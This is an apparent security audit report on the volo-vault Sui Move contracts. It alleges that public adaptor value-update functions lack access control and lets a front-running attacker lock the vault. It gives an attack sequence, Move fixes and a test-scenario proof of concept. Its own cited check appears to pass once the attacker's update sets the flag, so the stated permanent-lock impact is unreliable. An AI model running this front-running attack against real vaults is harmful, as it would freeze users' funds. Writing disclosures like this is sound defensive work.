# Audit Report

## Title
Missing Access Control in Adaptor Value Update Functions Allows Permanent Vault DoS

## Summary
All adaptor value update functions lack access control, allowing any attacker to front-run the operator during vault operations and poison the operation tracking table with duplicate keys. This permanently locks the vault in `VAULT_DURING_OPERATION_STATUS` with no admin recovery path, blocking all deposits and withdrawals.

## Finding Description

The vulnerability stems from a complete absence of access control on adaptor value update functions combined with a duplicate key insertion that aborts without recovery.

**Missing Access Control:** All five adaptor update functions are declared as `public fun`, making them callable by any external account:
- Navi adaptor [1](#0-0) 
- Cetus adaptor [2](#0-1) 
- Suilend adaptor [3](#0-2) 
- Momentum adaptor [4](#0-3) 
- Receipt adaptor [5](#0-4) 

These functions call `finish_update_asset_value` [6](#0-5) , which during vault operations conditionally adds entries to the operation tracking table using `Table::add()` [7](#0-6) . This insertion aborts if the key already exists, with no duplicate check or capability validation.

**Attack Sequence:**

1. Operator calls `start_op_with_bag`, which records borrowed assets in `asset_types_borrowed` and transitions vault status to `VAULT_DURING_OPERATION_STATUS` [8](#0-7) 

2. Operator calls `end_op_with_bag`, which returns all assets and enables value updates [9](#0-8)  by setting `value_update_enabled = true` [10](#0-9) 

3. **Attack Window:** Attacker monitors `OperationStarted` events to identify borrowed assets, then front-runs operator's value update transaction by calling public adaptor functions with higher gas

4. Attacker's calls succeed, adding entries to `asset_types_updated` table [11](#0-10) 

5. Operator's legitimate update calls abort at `Table::add()` with duplicate key error

6. Vault becomes stuck because `check_op_value_update_record` requires all borrowed assets to be marked as updated [12](#0-11) , but operator cannot re-update due to duplicate key aborts

7. No recovery exists: admin's `set_enabled` function explicitly prevents status changes when vault is in operation [13](#0-12) 

The only validation in `finish_update_asset_value` is `assert_enabled()` [14](#0-13) , which only checks that status is not `VAULT_DISABLED_STATUS` [15](#0-14) , allowing operations during `VAULT_DURING_OPERATION_STATUS`.

## Impact Explanation

**Critical Denial of Service:**
- Vault permanently stuck in `VAULT_DURING_OPERATION_STATUS` with no admin override capability
- All user deposit requests abort due to `assert_normal()` requirement [16](#0-15) 
- All user withdraw requests abort due to `assert_normal()` requirement [17](#0-16) 
- No new operations can start due to `assert_normal()` in `pre_vault_check` [18](#0-17) 
- Recovery requires protocol upgrade or contract redeployment

**Secondary Impact:**
- Attacker can manipulate asset valuation timestamps by front-running with arbitrary timing
- This affects loss tolerance calculations which rely on accurate asset value tracking
- Validation in `check_op_value_update_record` only verifies presence of update flag, not who performed the update or value correctness [12](#0-11) 

## Likelihood Explanation

**High Probability:**
- **Reachability:** Functions are `public fun` callable via Programmable Transaction Blocks with shared objects (Vault, OracleConfig, Clock, Storage)
- **Attack Complexity:** Low - attacker monitors on-chain `OperationStarted` events, extracts borrowed asset list, then front-runs with higher gas price
- **Prerequisites:** Only requires vault to be in active operation, which occurs regularly for yield optimization
- **Attack Cost:** Minimal (only transaction gas fees, typically < 0.01 SUI)
- **No Authentication:** Zero capability or access control checks in adaptor functions
- **Attack Window:** Multiple blocks exist between `end_op_with_bag` and operator's value updates, providing ample time for front-running

The attack is economically rational for griefing, competitor sabotage, or manipulation of external positions dependent on the vault's availability.

## Recommendation

**Immediate Fix:** Add operator capability check to all adaptor update functions:

```move
public fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    operation: &Operation,
    cap: &OperatorCap,  // Add this parameter
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    vault::assert_operator_not_freezed(operation, cap);  // Add this check
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
    // ... rest of function
}
```

Apply this pattern to all five adaptor update functions.

**Alternative Fix:** Modify `finish_update_asset_value` to use `Table::contains()` check before insertion:

```move
if (
    self.status() == VAULT_DURING_OPERATION_STATUS 
    && self.op_value_update_record.value_update_enabled 
    && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
) {
    if (!self.op_value_update_record.asset_types_updated.contains(asset_type)) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    } else {
        // Update existing entry
        let value = self.op_value_update_record.asset_types_updated.borrow_mut(asset_type);
        *value = true;
    }
}
```

**Emergency Recovery:** Add admin-only emergency function to force clear operation state (requires careful design to prevent abuse):

```move
public fun emergency_clear_operation<PrincipalCoinType>(
    _: &AdminCap,
    vault: &mut Vault<PrincipalCoinType>,
) {
    vault.clear_op_value_update_record();
    vault.set_status(VAULT_NORMAL_STATUS);
    emit(EmergencyOperationCleared { vault_id: vault.vault_id() });
}
```

## Proof of Concept

```move
#[test]
fun test_adaptor_access_control_dos() {
    // Setup: Create vault, start operation, enable value updates
    let mut scenario = test_scenario::begin(ADMIN);
    
    // ... initialization code for vault, operator, assets ...
    
    test_scenario::next_tx(&mut scenario, OPERATOR);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let operation = test_scenario::take_shared<Operation>(&scenario);
        let cap = test_scenario::take_from_sender<OperatorCap>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        
        // Operator starts operation
        let (bag, tx, tx_check, principal, coin) = operation::start_op_with_bag<SUI, USDC, MainMarket>(
            &mut vault, &operation, &cap, &clock, 
            vector[NAVI_ASSET_ID], vector[type_name::get<NaviAccountCap>()],
            1000, 0, test_scenario::ctx(&mut scenario)
        );
        
        // Operator ends operation (enables value updates)
        operation::end_op_with_bag<SUI, USDC, MainMarket>(
            &mut vault, &operation, &cap, bag, tx, principal, coin
        );
        
        // Attacker (non-operator) can now call adaptor update function
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        test_scenario::return_to_sender(&scenario, cap);
        test_scenario::return_shared(clock);
    };
    
    test_scenario::next_tx(&mut scenario, ATTACKER);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let config = test_scenario::take_shared<OracleConfig>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        let mut storage = test_scenario::take_shared<Storage>(&scenario);
        
        // Attacker front-runs operator's value update call
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock, 
            string::utf8(b"navi_0"), &mut storage
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(storage);
    };
    
    test_scenario::next_tx(&mut scenario, OPERATOR);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let config = test_scenario::take_shared<OracleConfig>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        let mut storage = test_scenario::take_shared<Storage>(&scenario);
        
        // Operator's legitimate call aborts with duplicate key error
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock, 
            string::utf8(b"navi_0"), &mut storage
        ); // ABORTS HERE
        
        // Vault now permanently stuck - cannot complete operation
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(clock);
        test_scenario::return_shared(storage);
    };
    
    // Verify vault is stuck and users cannot deposit/withdraw
    test_scenario::next_tx(&mut scenario, USER);
    {
        let mut vault = test_scenario::take_shared<Vault<SUI>>(&scenario);
        let clock = test_scenario::take_shared<Clock>(&scenario);
        let receipt = test_scenario::take_from_sender<Receipt>(&scenario);
        let coin = coin::mint_for_testing<SUI>(1000, test_scenario::ctx(&mut scenario));
        
        // User deposit request aborts due to assert_normal() check
        vault.request_deposit(coin, &clock, 1000, object::id(&receipt), USER); // ABORTS
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(clock);
        test_scenario::return_to_sender(&scenario, receipt);
    };
    
    test_scenario::end(scenario);
}
```

### Citations

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-13)
```text
public fun update_navi_position_value<PrincipalCoinType>(
```

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L28-28)
```text
    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L19-19)
```text
public fun update_cetus_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/suilend_adaptor.move (L23-23)
```text
public fun update_suilend_position_value<PrincipalCoinType, ObligationType>(
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-21)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
```

**File:** volo-vault/sources/adaptors/receipt_adaptor.move (L16-16)
```text
public fun update_receipt_value<PrincipalCoinType, PrincipalCoinTypeB>(
```

**File:** volo-vault/sources/volo_vault.move (L523-523)
```text
    assert!(self.status() != VAULT_DURING_OPERATION_STATUS, ERR_VAULT_DURING_OPERATION);
```

**File:** volo-vault/sources/volo_vault.move (L645-647)
```text
public(package) fun assert_enabled<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() != VAULT_DISABLED_STATUS, ERR_VAULT_NOT_ENABLED);
}
```

**File:** volo-vault/sources/volo_vault.move (L716-716)
```text
    self.assert_normal();
```

**File:** volo-vault/sources/volo_vault.move (L905-905)
```text
    self.assert_normal();
```

**File:** volo-vault/sources/volo_vault.move (L1181-1181)
```text
    self.assert_enabled();
```

**File:** volo-vault/sources/volo_vault.move (L1189-1195)
```text
    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };
```

**File:** volo-vault/sources/volo_vault.move (L1215-1218)
```text
    record.asset_types_borrowed.do_ref!(|asset_type| {
        assert!(record.asset_types_updated.contains(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
        assert!(*record.asset_types_updated.borrow(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
    });
```

**File:** volo-vault/sources/volo_vault.move (L1246-1246)
```text
    self.op_value_update_record.value_update_enabled = true;
```

**File:** volo-vault/sources/operation.move (L73-74)
```text
    vault.assert_normal();
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
```

**File:** volo-vault/sources/operation.move (L294-294)
```text
    vault.enable_op_value_update();
```
